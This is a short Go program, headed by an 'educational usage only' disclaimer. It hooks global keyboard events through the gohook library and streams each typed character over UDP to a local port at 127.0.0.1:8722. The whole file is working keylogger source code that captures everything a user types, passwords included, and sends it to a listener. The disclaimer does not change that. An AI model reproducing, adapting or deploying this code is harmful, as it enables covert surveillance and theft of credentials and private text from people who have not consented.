// STATEMENT:
// In consideration of all possible negative effects this software will bring,
// this software is developed only for educational usage.
// Any malicious usage of this software is forbidden and unrelated to the author.

package main

import (
	"fmt"
	hook "github.com/robotn/gohook"
	"net"
)

func main() {
	conn, err := net.Dial("udp", "127.0.0.1:8722")
	if err != nil {
		return
	}
	defer conn.Close()

	evChan := hook.Start()
	defer hook.End()
	for ev := range evChan {
		if ev.Keychar != 0 && ev.Keychar != 65535 {
			conn.Write([]byte(fmt.Sprintf("%c", ev.Keychar)))
		}
	}
}
